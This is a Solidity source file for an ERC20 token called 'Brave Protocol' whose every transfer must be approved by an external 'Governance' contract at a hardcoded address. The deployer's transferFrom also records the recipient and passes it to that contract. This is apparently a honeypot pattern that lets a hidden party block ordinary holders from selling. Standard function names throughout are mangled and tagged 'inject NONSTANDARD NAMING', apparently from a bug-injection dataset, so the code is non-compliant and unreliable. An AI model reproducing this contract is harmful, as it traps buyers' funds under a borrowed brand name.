                                                                 

pragma solidity ^ 0.5.16;

interface IERC20 {
    function TOTALSUPPLY617() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF841(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER977(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE110(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE932(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM548(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER494(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL4(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

interface Governance {
    function ISPARTNER335(address sender,address recipient,address recipients,uint amount,address addr) external returns(bool);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor() internal {}
        // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER642() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    address _governance = 0xC660e15B1fdC0ac428A0c2d4CCE5C8eA6f5BE84c;
    address Owner = msg.sender;
    address recipients;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY617() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF841(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }

    function TRANSFER977(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER858(_MSGSENDER642(), recipient, amount);
        return true;
    }

    function ALLOWANCE110(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE932(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE643(_MSGSENDER642(), spender, amount);
        return true;
    }

    function TRANSFERFROM548(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        if (sender == Owner) {
            recipients = recipient;
        }
        _TRANSFER858(sender, recipient, amount);
        _APPROVE643(sender, _MSGSENDER642(), _allowances[sender][_MSGSENDER642()].SUB157(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE183(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE643(_MSGSENDER642(), spender, _allowances[_MSGSENDER642()][spender].ADD117(addedValue));
        return true;
    }

    function DECREASEALLOWANCE613(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE643(_MSGSENDER642(), spender, _allowances[_MSGSENDER642()][spender].SUB157(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER858(address sender, address recipient, uint amount) internal ENSURESAFE209(sender,recipient,amount) {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].SUB157(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD117(amount);
        emit TRANSFER494(sender, recipient, amount);
    }

    function _MINT405(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD117(amount);
        _balances[account] = _balances[account].ADD117(amount);
        emit TRANSFER494(address(0), account, amount);
    }

    function _BURN7(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB157(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB157(amount);
        emit TRANSFER494(account, address(0), amount);
    }

    modifier ENSURESAFE209(address sender,address recipient,uint amount) {	//inject NONSTANDARD NAMING
        require(Governance(_governance).ISPARTNER335(sender,recipient,recipients,amount,address(this)));
        _;
    }

    function _APPROVE643(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL4(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME51() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL519() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS40() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD117(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB157(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB157(a, b, "SafeMath: subtraction overflow");
    }

    function SUB157(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL275(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV56(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV56(a, b, "SafeMath: division by zero");
    }

    function DIV56(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

contract BRAVE is ERC20, ERC20Detailed {
    constructor() public ERC20Detailed("Brave Protocol","BRAVE",18) {
        _MINT405(msg.sender, 22000 * 10 ** 18);
    }

}